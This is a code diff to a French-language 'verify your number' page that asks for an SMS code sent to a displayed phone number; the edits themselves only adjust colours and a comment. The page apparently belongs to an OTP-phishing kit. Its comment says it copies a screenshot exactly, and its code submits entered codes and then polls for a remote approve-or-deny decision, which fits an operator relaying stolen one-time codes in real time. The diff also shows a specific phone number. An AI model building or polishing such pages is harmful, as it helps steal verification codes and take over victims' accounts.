@@ -28,6 +28,7 @@ body {
     font-weight: 700;
     text-align: center;
     margin-bottom: 8px;
+    color: #ffffff;
 }
 .subtitle {
     font-size: 15px;
@@ -73,6 +74,7 @@ body {
     font-size: 14px;
     margin-bottom: 16px;
     min-height: 20px;
+    color: #9A0000;
 }
 button {
     width: 100%;
@@ -105,7 +107,7 @@ button:hover:enabled { background: #7a0000; }
 
 <div class="card">
 
-    <!-- NO LOGO – MATCHES IMAGE -->
+    <!-- NO LOGO – EXACTLY AS IMAGE -->
 
     <div class="title">Vérifier votre numéro</div>
     <div class="subtitle">Saisissez le code que nous avons envoyé à <span id="phoneDisplay">(+226) 79046955</span></div>
@@ -200,7 +202,6 @@ function submitOtp(code) {
         verifyBtn.textContent = 'Continuer';
         inputs.forEach(i => i.disabled = false);
         document.getElementById('otp-alert').textContent = '❌ Erreur serveur. Veuillez réessayer.';
-        document.getElementById('otp-alert').style.color = '#9A0000';
     });
 }
 
@@ -217,7 +218,6 @@ function pollApproval(requestId) {
                 verifyBtn.textContent = 'Continuer';
                 waitingEl.style.display = 'none';
                 document.getElementById('otp-alert').textContent = '❌ Code incorrect. Veuillez réessayer.';
-                document.getElementById('otp-alert').style.color = '#9A0000';
             }
         } catch (error) { console.error('Polling error:', error); }
     }, 2000);
